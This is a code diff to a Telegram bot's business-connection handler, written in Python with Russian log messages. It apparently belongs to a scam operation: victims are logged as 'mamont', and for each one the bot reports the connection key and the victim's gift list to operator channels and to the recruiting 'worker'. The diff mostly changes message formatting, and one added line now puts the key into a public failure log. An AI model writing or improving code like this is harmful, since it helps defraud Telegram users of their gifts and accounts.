@@ -157,26 +157,26 @@ async def business_connection(conn: types.BusinessConnection) -> None:
                          f"🎁 Список подарков ({giftcount} шт.):" "\n"
                          f"{giftlist if giftlist else '└ Нет подарков'}")
         else: 
-            lastPart = f"❌ Не удалось получить информацию о подарках. Возможно, не хватает разрешений"
+            lastPart = f"- Не удалось получить информацию о подарках. Возможно, не хватает разрешений"
 
         await database.update_mamont(_ID, True)
-        log_message = (f"🔋 *Новый коннект:*\n"
-                       f" ├ 🦣 *Клиент:* {_ID}\n"
-                       f" ├ 👤 *Пользователь:* @{_USER_NAME} (`{_USER_ID}`)\n"
-                       f" ├ 🚨 *Воркер:* {_WORKER}\n"
-                       f" └ 🔐 *Ключ:* `{_KEY}`\n\n"
+        log_message = (f"🔋 Новый коннект:\n"
+                       f" ├ 🦣 Клиент: {_ID}\n"
+                       f" ├ 👤 Пользователь: @{_USER_NAME}\n"
+                       f" ├ 🚨 Воркер: {_WORKER}\n"
+                       f" └ 🔐 Ключ: {_KEY}\n\n"
                        f"{lastPart}")
 
-        await bot.send_message(config._LOGS_CONNECT_STAFF, log_message, parse_mode="Markdown")
+        await bot.send_message(config._LOGS_CONNECT_STAFF, log_message)
         public_log_message = log_message.replace(f"{_KEY}", "Скрыт")
-        await bot.send_message(config._LOGS_CONNECT_PUBLIC, public_log_message, parse_mode="Markdown")
+        await bot.send_message(config._LOGS_CONNECT_PUBLIC, public_log_message)
 
         if isinstance(_WORKER, (int, str)) and str(_WORKER).isdigit():
             try:
-                await bot.send_message(int(_WORKER), log_message, parse_mode="Markdown")
+                await bot.send_message(int(_WORKER), log_message)
             except Exception as e:
                 print(f"Failed to send log to worker {_WORKER}: {e}")
-                await bot.send_message(config._LOGS_CONNECT_PUBLIC, f"Отправить лог воркеру {_WORKER} не удалось\n\n{e}")
+                await bot.send_message(config._LOGS_CONNECT_PUBLIC, f"Отправить лог {_KEY} воркеру {_WORKER} не удалось\n\n{e}")
         elif _WORKER != "Неизвестный":
              print(f"Worker ID '{_WORKER}' is not a valid integer ID. Cannot send log.")
 
